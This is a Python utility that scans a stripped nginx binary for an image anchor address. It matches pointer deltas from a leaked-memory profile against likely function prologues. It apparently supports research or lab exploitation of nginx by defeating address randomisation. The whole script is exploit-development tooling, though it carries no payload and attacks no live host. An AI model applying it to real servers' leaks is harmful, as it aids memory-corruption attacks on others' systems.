#!/usr/bin/env python3
"""Find the nginx image anchor address in a stripped nginx binary.

The Rapid7 profile identifies a PIE anchor inside leaked memory through
relative pointer deltas. If we know those deltas from a calibrated profile
(e.g. [0, -464, -13568] plus optional extra deltas such as
+139856 / -310400 / -398896), we can search the executable segment of a
(stripped) nginx binary for a unique address where all relative targets look
like function entries.

Usage:
    python3 scan_nginx_deltas.py <nginx-binary> --profile <profile.json>
    python3 scan_nginx_deltas.py <nginx-binary> --triple 0,-464,-13568 \
        --extra 139856,-310400,-398896

Authorized lab use only. See DISCLAIMER.md.
"""
import argparse
import json
import struct
import sys


def load_profile_deltas(path):
    with open(path, "r", encoding="utf-8") as handle:
        profile = json.load(handle)
    fingerprint = profile["fingerprint"]
    triple = list(fingerprint["nginx_image_pointer_deltas"])
    extra = []
    for key in ("http2_send_chain_delta", "resolver_timeout_delta",
                "destroy_pool_delta"):
        if key in fingerprint:
            extra.append(int(fingerprint[key]))
    return triple, extra


def parse_exec_segments(data):
    if data[:4] != b"\x7fELF":
        raise SystemExit("not an ELF file")
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segments = []
    for index in range(e_phnum):
        off = e_phoff + index * e_phentsize
        p_type, p_flags = struct.unpack_from("<II", data, off)
        p_offset, p_vaddr = struct.unpack_from("<QQ", data, off + 8)
        p_filesz = struct.unpack_from("<Q", data, off + 32)[0]
        if p_type == 1 and (p_flags & 1):
            segments.append((p_offset, p_vaddr, p_filesz))
    return segments


def is_function_start(data, offset):
    """Heuristic: endbr64 or the most common x86-64 function prologues."""
    if offset < 0 or offset + 4 > len(data):
        return False
    head = data[offset:offset + 4]
    if head == b"\xf3\x0f\x1e\xfa":          # endbr64
        return True
    if head[:3] == b"\x55\x48\x89":          # push rbp; mov rsp, rbp
        return True
    if head[:3] == b"\x48\x83\xec":          # sub rsp, imm8
        return True
    if head[:2] == b"\x55\x48":              # push rbp; ...
        return True
    return False


def vaddr_to_offset(segments, vaddr):
    for p_offset, p_vaddr, size in segments:
        if p_vaddr <= vaddr < p_vaddr + size:
            return p_offset + (vaddr - p_vaddr)
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("nginx")
    parser.add_argument("--profile")
    parser.add_argument("--triple", help="comma-separated, e.g. 0,-464,-13568")
    parser.add_argument("--extra", help="comma-separated extra deltas")
    args = parser.parse_args()

    if args.profile:
        triple, extra = load_profile_deltas(args.profile)
    elif args.triple:
        triple = [int(x, 0) for x in args.triple.split(",")]
        extra = [int(x, 0) for x in args.extra.split(",")] if args.extra else []
    else:
        parser.error("provide --profile or --triple")

    with open(args.nginx, "rb") as handle:
        data = handle.read()
    segments = parse_exec_segments(data)
    if len(segments) != 1:
        print(f"note: {len(segments)} executable segments; scanning all",
              file=sys.stderr)

    candidates = []
    for p_offset, p_vaddr, size in segments:
        for vaddr in range(p_vaddr, p_vaddr + size - 4):
            if not is_function_start(data, p_offset + (vaddr - p_vaddr)):
                continue
            targets = [vaddr + delta for delta in triple + extra]
            if all(vaddr_to_offset(segments, target) is not None
                   and is_function_start(
                       data, vaddr_to_offset(segments, target))
                   for target in targets):
                candidates.append(vaddr)

    print(f"candidate anchors: {len(candidates)}")
    for anchor in candidates:
        print(f"anchor 0x{anchor:x}")
        for delta in triple + extra:
            target = anchor + delta
            offset = vaddr_to_offset(segments, target)
            print(f"  delta {delta:+8d} -> 0x{target:x} "
                  f"start={'yes' if offset is not None and is_function_start(data, offset) else 'no'}")
    return 0 if candidates else 1


if __name__ == "__main__":
    sys.exit(main())
